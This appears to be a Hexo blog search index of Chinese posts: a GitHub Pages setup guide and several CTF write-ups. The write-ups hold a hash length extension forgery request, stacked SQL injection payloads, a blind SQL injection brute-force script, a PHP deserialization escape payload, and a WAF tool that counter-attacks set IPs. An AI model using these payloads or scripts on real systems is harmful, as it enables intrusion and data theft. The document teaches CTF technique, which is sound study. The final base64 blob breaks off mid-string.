<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HEXO+Githubpage搭建博客</title>
    <url>//articles/1558f80b43.html</url>
    <content><![CDATA[<h2 id="Github新建项目"><a href="#Github新建项目" class="headerlink" title="Github新建项目"></a>Github新建项目</h2><ul>
<li>这个项目命名方式为:<code>&lt;用户名&gt;.github.io</code> 如下图</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668210563706.png" alt></p>
<ul>
<li>打开项目页面选择<code>Clone or download</code>点击<code>Use SSH</code></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668211846352.png" alt></p>
<ul>
<li>复制SSH地址如下图</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/1566821283557.png" alt></p>
<h2 id="创建SSH公钥"><a href="#创建SSH公钥" class="headerlink" title="创建SSH公钥"></a>创建SSH公钥</h2><pre><code class="shell">ssh-keygen -t rsa -b 4096 -C &quot;你的邮箱@qq.com&quot;
ssh-add ~/.ssh/id_rsa</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668227842615.png" alt></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668229504873.png" alt></p>
<ul>
<li>查看key</li>
</ul>
<pre><code>cd /root/.ssh
cat id_rsa.pub</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668231662963.png" alt></p>
<ul>
<li>github创建SSH-KEY,将创建的key值复制上去,保存即可</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668233457778.png" alt></p>
<ul>
<li>添加github用户上传用户信息</li>
</ul>
<pre><code class="shell">git config --global user.name &quot;你的用户名&quot;
git config --global user.email “你的邮箱&quot;</code></pre>
<h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2><pre><code>apt install npm</code></pre><h2 id="安装HEXO"><a href="#安装HEXO" class="headerlink" title="安装HEXO"></a>安装HEXO</h2><pre><code class="shell">npm install -g hexo
npm install hexo --save
hexo -v #查看安装是否成功，成功显示版本信息如下图</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668238496198.png" alt></p>
<h2 id="生成一个博客"><a href="#生成一个博客" class="headerlink" title="生成一个博客"></a>生成一个博客</h2><pre><code class="shell">hexo init &lt;文件夹&gt;
#如：hexo init myblog</code></pre>
<p>命令执行后会生成一个文件夹里面是博客文件。下一步进入文件夹，执行<code>hexo g</code>即可生成静态文件再执行<code>hexo s</code>,即可本地预览博客</p>
<pre><code>hexo g
hexo s</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668241705588.png" alt></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668242397730.png" alt="img"></p>
<h2 id="跟换主题"><a href="#跟换主题" class="headerlink" title="跟换主题"></a>跟换主题</h2><p>官方主题网站：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a></p>
<p>找到喜欢的主题，到github搜索，直接clone到主题文件夹下。</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668244631639.png" alt="img"></p>
<p>复制文件名，修改博客文件夹下的<code>_config.yml</code></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668245176334.png" alt="img"></p>
<p>themes修改为刚刚克隆下来的文件夹名</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668246396496.png" alt="img"></p>
<p><code>hexo g 、hexo s</code>本地查看一下效果</p>
<h2 id="上传至github"><a href="#上传至github" class="headerlink" title="上传至github"></a>上传至github</h2><ul>
<li>安装git插件</li>
</ul>
<pre><code>npm install hexo-deployer-git --save</code></pre><ul>
<li>修改<code>_config.yml</code>最后为下图，其中repo修改为第一步git项目的ssh地址</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668249164392.png" alt="img"></p>
<ul>
<li>上传至github</li>
</ul>
<pre><code>hexo g
hexo d</code></pre><p>打开设置好的项目域名即可查看效果</p>
<h2 id="上传文章"><a href="#上传文章" class="headerlink" title="上传文章"></a>上传文章</h2><p>将markdown文章放到博客根目录的source/_post下执行<code>hexo g</code>和<code>hexo d</code></p>
<p>或者hexo new  “文章名”，但是md文件必须遵循下面格式：</p>
<p>文章头加上如下代码</p>
<pre><code class="markdown">---

title: Python沙箱逃逸学习笔记

date: 2019-08-15 12:51:44

tags: CTF

---</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668253185151.png" alt="img"></p>
<h2 id="删除文章"><a href="#删除文章" class="headerlink" title="删除文章"></a>删除文章</h2><p>直接把文件删除再次执行<code>hexo g</code>和<code>hexo d</code></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>Hash长度扩展攻击学习笔记</title>
    <url>//articles/1559adf164.html</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p> <a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="noopener">实验吧：让我进去</a></p>
<h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><pre><code class="php">$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;
$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!

$username = $_POST[&quot;username&quot;];
$password = $_POST[&quot;password&quot;];

if (!empty($_COOKIE[&quot;getmein&quot;])) {
    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {
        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {
            echo &quot;Congratulations! You are a registered user.\n&quot;;
            die (&quot;The flag is &quot;. $flag);
        }
        else {
            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);
        }
    }
    else {
        die (&quot;You are not an admin! LEAVE.&quot;);
    }
}

setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));

if (empty($_COOKIE[&quot;source&quot;])) {
    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));
}
else {
    if ($_COOKIE[&quot;source&quot;] != 0) {
        echo &quot;&quot;; // This source code is outputted here
    }
}

$username = $_POST[&quot;username&quot;];
$password = $_POST[&quot;password&quot;];

if (!empty($_COOKIE[&quot;getmein&quot;])) {
    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {
        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {
            echo &quot;Congratulations! You are a registered user.\n&quot;;
            die (&quot;The flag is &quot;. $flag);
        }
        else {
            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);
        }
    }
    else {
        die (&quot;You are not an admin! LEAVE.&quot;);
    }
}

setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));

if (empty($_COOKIE[&quot;source&quot;])) {
    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));
}
else {
    if ($_COOKIE[&quot;source&quot;] != 0) {
        echo &quot;&quot;; // This source code is outputted here
    }
}</code></pre>
<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul>
<li><strong>HASHPUMP：</strong></li>
</ul>
<pre><code class="shell">root@kali:~# hashpump
Input Signature: 571580b26c65f306376d4f64e53cb5c7
Input Data: admin
Input Key Length: 20
Input Data to Add: admin
e18dfd8404515016d3aeeea2aa196909
admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin</code></pre>
<ul>
<li><strong>构造payload</strong></li>
</ul>
<pre><code>POST /web/kzhan.php HTTP/1.1
Host: ctf5.shiyanbar.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 151
Connection: close
Referer: http://ctf5.shiyanbar.com/web/kzhan.php
Cookie: sample-hash=571580b26c65f306376d4f64e53cb5c7; source=1;getmein=e18dfd8404515016d3aeeea2aa196909; Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1567956475; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*214456%2CnickName%3Agqleung
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1

username=admin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00admin</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190912/15682801246486.png" alt="img"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>Suctf-Easy_SQL-复现总结</title>
    <url>//articles/15614f899d.html</url>
    <content><![CDATA[<p>这道题考了mysql的SQL Mode如果没有运维事故把源码泄露了还自己感觉脑洞也有点大。但是有师傅fuzz出来了一个非预期解。</p>
<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><pre><code class="php">&lt;?php
    session_start();

    include_once &quot;config.php&quot;;

    $post = array();
    $get = array();
    global $MysqlLink;

    //GetPara();
    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);
    if(!$MysqlLink){
        die(&quot;Mysql Connect Error!&quot;);
    }
    $selectDB = mysqli_select_db($MysqlLink,$dataName);
    if(!$selectDB){
        die(&quot;Choose Database Error!&quot;);
    }

    foreach ($_POST as $k=&gt;$v){
        if(!empty($v)&amp;&amp;is_string($v)){
            $post[$k] = trim(addslashes($v));
        }
    }
    foreach ($_GET as $k=&gt;$v){
        }
    }
    //die();
    ?&gt;

&lt;html&gt;
&lt;head&gt;
&lt;/head&gt;

&lt;body&gt;

&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;
&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;

&lt;?php

    if(isset($post[&#39;query&#39;])){
        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;
        //var_dump(preg_match(&quot;/{$BlackList}/is&quot;,$post[&#39;query&#39;]));
        if(preg_match(&quot;/{$BlackList}/is&quot;,$post[&#39;query&#39;])){
            //echo $post[&#39;query&#39;];
            die(&quot;Nonono.&quot;);
        }
        if(strlen($post[&#39;query&#39;])&gt;40){
            die(&quot;Too long.&quot;);
        }
        $sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;
        mysqli_multi_query($MysqlLink,$sql);
        do{
            if($res = mysqli_store_result($MysqlLink)){
                while($row = mysqli_fetch_row($res)){
                    print_r($row);
                }
            }
        }while(@mysqli_next_result($MysqlLink));

    }

    ?&gt;</code></pre>
<p>源码泄露如上。可以直接看到执行语句：<code>select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag</code>有一个管道符但是在MYSQL中是不能直接使用管道符的会将<code>||</code>视为运算符。需要设置</p>
<p>sql_mode为<code>PIPES_AS_CONCA</code>.这里也是一个堆叠注入。payload如下：</p>
<pre><code class="mysql">1;show databases; #查库
1;show tables;#查表
最终payload:
1;set sql_mode=PIPES_AS_CONCA;select 1</code></pre>
<h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><pre><code>*,1</code></pre><p>相关知识：</p>
<p><strong>1. SQL语法支持类</strong></p>
<ul>
<li><p><strong>ONLY_FULL_GROUP_BY</strong>   对于GROUP BY聚合操作，如果在SELECT中的列、HAVING或者ORDER BY子句的列，没有在GROUP BY中出现，那么这个SQL是不合法的。是可以理解的，因为不在 group by 的列查出来展示会有矛盾。<br> 在5.7中默认启用，所以在实施5.6升级到5.7的过程需要注意：</p>
<pre><code> Expression #1 of SELECT list is not in GROUP BY
clause and contains nonaggregated column
&#39;1066export.ebay_order_items.TransactionID&#39; which
is not functionally dependent on columns in GROUP BY
clause; this is incompatible with sql_mode=only_full_group_by</code></pre></li>
<li><p><strong>ANSI_QUOTES</strong>  启用 ANSI_QUOTES 后，不能用双引号来引用字符串，因为它被解释为识别符，作用与 <code>一样。设置它以后，</code>update t set f1=”” …`，会报 Unknown column ‘’ in ‘field list 这样的语法错误。</p>
</li>
<li><p><strong>PIPES_AS_CONCAT</strong>   将 <code>||</code> 视为字符串的连接操作符而非 或 运算符，这和Oracle数据库是一样的，也和字符串的拼接函数 CONCAT() 相类似。</p>
</li>
<li><p><strong>NO_TABLE_OPTIONS</strong>   使用 <code>SHOW CREATE TABLE</code> 时不会输出MySQL特有的语法部分，如 <code>ENGINE</code> ，这个在使用 mysqldump 跨DB种类迁移的时候需要考虑。</p>
</li>
<li><p><strong>NO_AUTO_CREATE_USER</strong>   字面意思不自动创建用户。在给MySQL用户授权时，我们习惯使用 <code>GRANT ... ON ... TO dbuser</code> 顺道一起创建用户。设置该选项后就与oracle操作类似，授权之前必须先建立用户。5.7.7开始也默认了。</p>
</li>
</ul>
<p><strong>2. 数据检查类</strong></p>
<ul>
<li><p><strong>NO_ZERO_DATE</strong>   认为日期 ‘0000-00-00’ 非法，与是否设置后面的严格模式有关。</p>
<ol>
<li>如果设置了严格模式，则 NO_ZERO_DATE 自然满足。但如果是 INSERT IGNORE 或 UPDATE IGNORE，’0000-00-00’依然允许且只显示warning</li>
<li>如果在非严格模式下，设置了<code>NO_ZERO_DATE</code>，效果与上面一样，’0000-00-00’允许但显示warning；如果没有设置<code>NO_ZERO_DATE</code>，no warning，当做完全合法的值。</li>
<li><code>NO_ZERO_IN_DATE</code>情况与上面类似，不同的是控制日期和天，是否可为 0 ，即 <code>2010-01-00</code> 是否合法。</li>
</ol>
</li>
<li><p><strong>NO_ENGINE_SUBSTITUTION</strong>   使用 <code>ALTER TABLE</code>或<code>CREATE TABLE</code> 指定 ENGINE 时， 需要的存储引擎被禁用或未编译，该如何处理。启用<code>NO_ENGINE_SUBSTITUTION</code>时，那么直接抛出错误；不设置此值时，CREATE用默认的存储引擎替代，ATLER不进行更改，并抛出一个 warning .</p>
</li>
<li><p><strong>STRICT_TRANS_TABLES</strong> 设置它，表示启用严格模式。<br> 注意 <code>STRICT_TRANS_TABLES</code> 不是几种策略的组合，单独指 <code>INSERT</code>、<code>UPDATE</code>出现少值或无效值该如何处理：</p>
<ol>
<li><p>前面提到的把 ‘’ 传给int，严格模式下非法，若启用非严格模式则变成0，产生一个warning</p>
</li>
<li><p>Out Of Range，变成插入最大边界值</p>
</li>
<li><p>A value is missing when a new row to be inserted does not contain  a value for a non-NULL column that has no explicit DEFAULT clause in  its definition</p>
</li>
</ol>
</li>
</ul>
<p>手册：<a href="https://mariadb.com/kb/en/library/sql-mode/" target="_blank" rel="noopener">https://mariadb.com/kb/en/library/sql-mode/</a></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-WAF专用于CTF攻防赛的WAF/日志审计系统</title>
    <url>//articles/1582a2990d.html</url>
    <content><![CDATA[<h2 id="CTF-WAF"><a href="#CTF-WAF" class="headerlink" title="CTF-WAF"></a>CTF-WAF</h2><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>该项目针对CTF线下AWD比赛临时开发的WAF，能够拦截XSS、SQl、反序列化、菜刀/蚁剑、以及一些CTF常见的危险函数流量。可以绕过对页面检测的check,拦截返回正常页面的html。并且能够对简单payload进行流量转发，自动反打设置好的IP。如果比赛禁止使用通防也可以一键关闭通防，作为流量监控审计所用。欢迎各位大佬对项目进行改进。使用时候可以使用.user.ini将其包含于所有php文件。</p>
<h2 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h2><ul>
<li><p><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-Gqleung-brightgreen.svg" alt>  </p>
</li>
<li><p><img src="https://img.shields.io/badge/%E5%8D%9A%E5%AE%A2-xiao%20leung's%20Blog-blueviolet" alt> </p>
</li>
<li><p><a href="https://github.com/sharpleung" target="_blank" rel="noopener"><img src="https://img.shields.io/badge/Github-sharpleung-green?logo=appveyor&style=flat" alt></a></p>
</li>
</ul>
<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><pre><code class="http">CTF_WAF.php(WAF主要文件)
waflog(文件夹)
    .........ip.txt(需要反打的ip)
    .........log.php(日志审计系统)</code></pre>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><ul>
<li>将<code>CTF_WAF.php</code>包含进需要保护的文件</li>
<li>开启<code>WAF</code>开关（<code>CTF_WAF.php</code>代码27行），设置返回页面（<code>CTF_WAF.php</code>代码26行）,</li>
</ul>
<pre><code class="php">$this-&gt;Waf_switch=1;//通防开启
$this-&gt;Waf_switch=0;//通防关闭
$this-&gt;resultPage=&quot;http://127.0.0.1/&quot;;//返回页面</code></pre>
<ul>
<li>设置需要反打（流量转发）的主机，在<code>waflog/ip.txt</code></li>
</ul>
<p><img src="https://raw.githubusercontent.com/sharpleung/CTF-WAF/master/picture/15688766013040.png" alt="img"></p>
<ul>
<li>模拟对本地主机进行攻击，可以发现并不会返回flag，说明对payload拦截成功</li>
</ul>
<p><img src="https://raw.githubusercontent.com/sharpleung/CTF-WAF/master/picture/pic2.png" alt="img"></p>
<ul>
<li>查看<code>waflog</code>文件夹下发现生成了logs.txt和flag.txt说明生成了日志文件和flag文件，打开即可看到ip对应的flag</li>
</ul>
<p><strong><img src="https://raw.githubusercontent.com/sharpleung/CTF-WAF/master/picture/pic3.bmp" alt="img"></strong></p>
<ul>
<li>修改日志系统密码<code>/waflog/log.php</code>代码4行，修改密码</li>
</ul>
<pre><code class="php">$passwd=&quot;admin&quot;;//修改密码</code></pre>
<ul>
<li>登陆后台发现记录了攻击payload。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/sharpleung/CTF-WAF/master/picture/pic4.png" alt="img"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN 2020 FINAL 部分Write Up</title>
    <url>//articles/159ab5557e.html</url>
    <content><![CDATA[<h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><ul>
<li>右键看源码有提示：SQL语句中两个变量可以控制。</li>
<li>同时可以得知真正的flag在<code>real_flag</code>的<code>flag</code>字段中</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/ciscn_final_1.png" alt="ciscn_final_1"></p>
<ul>
<li>手动fuzz发现两边过滤的字符是不一样的。过滤了很多，在测试时候发现select语句是没有被过滤的，但是union是被过滤了。</li>
<li>id能用的有减号、<code>/*</code>、<code>or</code></li>
<li>limit能用的有括弧、<code>*/</code></li>
<li>这就很明显了。/**/正好可以注释掉limit</li>
<li>然后用select查询出flag，将flag切片转换为aiisc码，然后用数字与之相减，如果相减得到0那就是Ture</li>
<li>先构造大概原理的伪代码</li>
</ul>
<pre><code class="sql">SELECT * FROM fake_flag WHERE id = 3 or 102-/* limit 0,1*/ ord(mid((select group_concat(flag)from real_flag),1,1))</code></pre>
<ul>
<li><p>这里有个问题就是过滤了空格。</p>
</li>
<li><p>空格可以直接用<code>\t</code>来代替</p>
</li>
<li><p>功能逗号被过滤用<code>from....for</code>来代替</p>
</li>
</ul>
<pre><code class="sql">SELECT * FROM fake_flag WHERE id = 3 or 102- /* limit 0,1*/ord(mid((select group_concat(flag)from real_flag)from(1)for(1)))</code></pre>
<ul>
<li>脚本</li>
</ul>
<pre><code class="python">import requests

flag = &quot;&quot;
url = &quot;http://www.ctf.com/&quot;
tables = r&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}_-&quot;
for j in range(1,40):
    for i in tables:
        payload=&quot;?id=3%%09or%%09%d-/*&amp;limit=10%%09and*/ord(mid((select%%09group_concat(flag)%%09from%%09real_flag)from(%d)for(1)))&quot;%(ord(i),j)
        #print(payload)
        r = requests.get(url+payload)
        if &quot;searched nothing&quot; in r.text:
            flag=flag+i
            print(flag)
            break</code></pre>
<p><img src="http://goodcheerleung.gitee.io/blog/ciscn_final_2.png" alt="ciscn_final_2"></p>
<h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><ul>
<li>国际惯例扫描一下，得到备份源码</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201007-210800@2x.png" alt="WX20201007-210800@2x"></p>
<ul>
<li>简单看一下源码，在<code>lib.php</code>存在一个反序列化点。</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201005-205532@2x.png" alt="WX20201005-205532@2x"></p>
<ul>
<li>全局搜索<code>update</code>查看哪里使用了这个方法，可以发现在<code>dashboard.php</code>存在调用<code>update</code>的情况。但是这里先是奖传入的内容赋值给一个数组，然后再进行序列化，传入一个<code>waf</code>对传入的内容进行了替换。但是waf是将部分关键字进行替换，这里可以基本确定是考察反序列化的字符逃逸问题。</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201005-205428@2x.png" alt="WX20201005-205428@2x"></p>
<ul>
<li>从源码可以知道flag就是在<code>flag.php</code>我们的目标就是读到<code>flag.php</code>源码即可。整个类最明显调用的地方就是<code>_DESTRUCT()</code>可以读取文件。</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201005-210603@2x.png" alt="WX20201005-210603@2x"></p>
<ul>
<li>这样目标就很明显了，我们需要控制<code>avatar</code>属性为<code>flag.php</code>,但是这里存在一个问题，就是waf是过滤了<code>flag</code>这个关键字，我们知道在遇到私有属性可以将小s改成S通过十六进制来代替不可见字符，同样我们可以通过十六进制来表示<code>flag.php</code>，这样就能轻松绕过waf的过滤，但是waf还有一个用处就是用来字符逃逸</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201005-213527@2x.png" alt="WX20201005-213433@2x"></p>
<ul>
<li>waf可以将flag替换为index,这样我们替换一个flag能够逃逸一个字符。</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201007-205541@2x.png" alt="WX20201007-205541@2x"></p>
<ul>
<li>由于我们能够控制的是序列化后的一个数组，所以我们要逃逸的是这么一个对象,<code>&quot;;s:1:&quot;1&quot;;</code>单引号是为了闭合前面制造逃逸的字符串，<code>;s:1:&quot;1&quot;;</code>是为了给数组增加一个元素，他的值是一个对象。</li>
</ul>
<pre><code class="php">&quot;;s:1:&quot;1&quot;;O:4:&quot;User&quot;:6:{S:8:&quot;username&quot;;S:1:&quot;1&quot;;S:8:&quot;password&quot;;S:1:&quot;1&quot;;S:3:&quot;age&quot;;S:1:&quot;1&quot;;S:5:&quot;email&quot;;S:1:&quot;1&quot;;S:12:&quot;\00User\00avatar&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;S:13:&quot;\00User\00content&quot;;S:0:&quot;&quot;;}</code></pre>
<ul>
<li>而上面的字符串长度为196，所以我们需要196个flag来制造逃逸。</li>
</ul>
<pre><code class="php">flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:1:&quot;1&quot;;O:4:&quot;User&quot;:6:{S:8:&quot;username&quot;;S:1:&quot;1&quot;;S:8:&quot;password&quot;;S:1:&quot;1&quot;;S:3:&quot;age&quot;;S:1:&quot;1&quot;;S:5:&quot;email&quot;;S:1:&quot;1&quot;;S:12:&quot;\00User\00avatar&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;S:13:&quot;\00User\00content&quot;;S:0:&quot;&quot;;}</code></pre>
<ul>
<li>这里有一个问题就是我们只能用<code>old_password</code>来逃逸，因为<code>dashboard.php</code>对其他参数进行了过滤，但是<code>old_password</code>没有进行过滤。</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201007-210152@2x.png" alt="WX20201007-210152@2x"></p>
<ul>
<li>Getflag</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201007-211522@2x.png" alt="WX20201007-211522@2x"></p>
<h2 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h2><ul>
<li>题目给了一张损坏了的PNG图片，在第八个chunk，length长度为0，所以要计算chunk[8]的长度。</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-085749@2x.png" alt="WX20201009-085749@2x"></p>
<ul>
<li>Chunk的长度是这个CHUNK IDAT到下一个IDAT的长度。</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-090038@2x.png" alt="WX20201009-090038@2x"></p>
<ul>
<li>CP下来，写个脚本计算一下长度。</li>
</ul>
<pre><code class="php">&lt;?php
$a = file_get_contents(&#39;1.txt&#39;);
echo strlen($a);
?&gt;</code></pre>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-090153@2x.png" alt="WX20201009-090153@2x"></p>
<ul>
<li>修改长度为<code>21543</code>,这样就可以将图片修复为正常的图片，得到hint，apache</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-090304@2x.png" alt="WX20201009-090304@2x"></p>
<p><img src="https://goodcheerleung.gitee.io/macpic/misc.png" alt="misc"></p>
<ul>
<li>在010编辑时候就发现，在图片的后面存在一串类似base64的东西。用万能的<code>strings</code>提取出来,去掉IDAT头</li>
</ul>
<pre><code>U2FsdGVkX1/Ofx56tIWCux0AX/p4s03W2eEQcTQzYayvGRDjQP9e8rtfVCtrFRUH1kC6YCKUJllScPEArUd61ppoSIhkVR+KBFZK2QdWZNZLXlZqlXUICmBLBtjlY4frBvyP2N+kjJofz0L+zSdWlC+eGqwHrx0u+/ri1ttLnDcSFBNA2fUPeKsYRH/7+wNq+PL/o98qN83J/DNIOoLFYzgP3Tj0Rz9++IXqnkzD0lwAib87pnz912PREL6Qr8Yoff57zNlhBsj8URJY59oIXnO7ZHQO1Gl43I+iYHIltG84M1TOBnhO71BNiCumRYiL2QBxvSqaMeg7XWMjPekE+MQhWSWQW4DiyUS5kq2+maLUEvTVvIyIX/75u/RoyazBBAu99oFlKYeVqBugA8PI2LdFAdBIFhTICNFUWX/G9f4tUtI9BYemTZ9cXQ9Q7alUmS6QqA0cZKEPZ9W3WZLltevTQofTvwQBkYFuKibOkTl5NfV4evnhagG1MNVrXvQaArdMYUoiWKzf+8usF94yRKYL+HQmnjw1n4XklPJHeeZfouQZedcTukou3CBeyHFhkaqoukz//b3ypzJnSgTQOAP+OVuWzIBcH+4oUdb4R6Lu/qsZ753s4gV3pdJYKCTxU+JAl4LRk0PE2ArENxD3oz7x991pP7t2zK6pmPIAptDO0xep8mR8H34VGAWOOeXFicZOFW0OfLIo2tyWWCHesJB1pa9eodwJcFw3gZXPDbCGJHUeXGFk55xcH0S0xKzNF0fO/Qfs/8uog1NU+BfpUbkb3k7fRUVYKHfzZD1VaqnGMlyh71tszfT3+HU5HSCvuicn9P6Xy4/oBNrQozbpcvYA2rKwurUXV5zvL9ff7/M8c7lrhZhzCHOlkHghtkBbBER7h6FhcBoJ2Ahtc5NjoOdzzXKsGjtQXdU/VIhwjFjD1MLw9xlrLH18hRXTvUxmGYcv5oo4iY0NRWLW81hrInFCAIyHw3iusANxz9MvKuE7ZdrHMNmwUnKm0Mn2qyHW7zTLiGnqfc2bjpnGp3D/unFzspFiYqlVUZyeti+s2JUeIU08zoZ28iDexBf1qAeoG4trvBfMboEF/iuR1U+b60e7Wj6uDLmTtx2yPMomTYp4nNzePdJU82kbq1lR1oROwbToFGZ7bzdD/J8ML0WwKHUKhe3LwC0klgab0X2BEaNkDGH1Yp4p1z/+2YSIcjXlccgw2slhuytfmc3DcdmaY45lWc+Hn267MLftVGPufFStd5Z/OHbqmjReVil/jv2N/sixpJofz53+W4n9URPhTDnlV6lEWLMOPpEytSYRSXUKjS2rrTdhJEu0e6F1VxLzL81zTgcLEo5JFwQyD2kTTaLXYeaZ2bDNnf02UxFd12Qup5+uRnLUhOotatddnTtKd2YGghpTCWfgYK5JlEeTgUUgDuJdvXFgNUQfl77ip6ljogwJss3LB5B28tUI9NXDDh